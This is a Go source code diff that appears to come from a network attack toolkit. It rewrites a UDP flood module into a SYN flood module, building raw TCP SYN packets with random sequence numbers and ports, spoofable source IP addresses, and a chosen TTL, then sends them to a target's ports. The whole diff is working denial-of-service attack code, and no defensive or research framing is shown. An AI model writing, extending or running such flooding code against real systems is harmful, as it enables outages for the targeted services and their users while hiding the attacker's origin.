@@ -3,18 +3,15 @@ package module
 import (
 	"os"
 	"log"
-	_"net"
-	_"time"
 	"strings"
-	_"strconv"
+	_"syscall"
 	"math/rand"
-	_"encoding/binary"
 
 	"cjr/protocol"
 	flags "github.com/jessevdk/go-flags"
 )
 
-type UDPFloodOpt struct {
+type SynFloodOpt struct {
 	BaseOption
 	Spoof string `short:"s" long:"spoof" description:"use spoof address" value-name:"address[/mask]" default:""`
 	DestFunc func(string) `short:"d" long:"destination" description:"destination address" value-name:"address"`
@@ -25,12 +22,12 @@ type UDPFloodOpt struct {
 	TTL uint `short:"t" long:"ttl" description:"set TTL of IP packet" value-name:"ttl" default:"64"`
 }
 
-func (u *UDPFloodOpt) IsBroadcast() bool {
+func (s SynFloodOpt) IsBroadcast() bool {
 	return false
 }
 
-func udpFloodEntry(remainFlags []string) {
-	var opts UDPFloodOpt
+func synFloodEntry(remainFlags []string) {
+	var opts SynFloodOpt
 
 	opts.PortFunc = func(portStr string) {
 		var st, en uint16
@@ -100,30 +97,27 @@ func udpFloodEntry(remainFlags []string) {
 		log.Fatal("no destination IP specified")
 	}
 
-	udpFloodStart(&opts)
+	packetSend(synFloodBuild, &opts)
 }
 
-func udpFloodStart(opts *UDPFloodOpt) {
-	packetSend(udpFloodBuild, opts)
-}
-
-var curPort int = 0
-
-func udpFloodBuild(opts_ CommonOption) []protocol.Layer {
-	opts := opts_.(*UDPFloodOpt)
+func synFloodBuild(opts_ CommonOption) []protocol.Layer {
+	opts := opts_.(*SynFloodOpt)
 	srcip := chooseIPv4(opts.Spoof)
-	// TODO fill some content
-	unknownAppData := &protocol.UnknownApplicationLayer {
-		Data: make([]byte, 1200, 1200),
-	}
 
 	pseudoHeader := make([]byte, 12, 12)
 	copy(pseudoHeader[0:4], srcip.To4())
 	copy(pseudoHeader[4:8], opts.dest.To4())
-	udp := &protocol.UDP {
+	tcp := &protocol.TCP {
 		PseudoHeader: pseudoHeader,
-		SrcPort: uint16(rand.Intn(65535) + 1),
+		SrcPort: uint16(rand.Intn(0xffff)),
 		DstPort: opts.ports[curPort],
+		Seq: uint32(rand.Intn(0x100000000)),
+		Ack: 0,
+		Flags: protocol.TCPFlags {
+			SYN: true,
+		},
+		Rwnd: 20 * 1460,
+		UrgPtr: 0,
 	}
 	curPort++
 	if curPort >= len(opts.ports) {
@@ -140,9 +134,9 @@ func udpFloodBuild(opts_ CommonOption) []protocol.Layer {
 		MF: false,
 		FragmentOffset: 0,
 		TTL: uint8(opts.TTL),
-		Protocol: protocol.IPP_UDP,
+		Protocol: protocol.IPP_TCP,
 		SrcIP: srcip,
 		DstIP: opts.dest,
 	}
-	return []protocol.Layer{ip4, udp, unknownAppData}
+	return []protocol.Layer{ip4, tcp}
 }
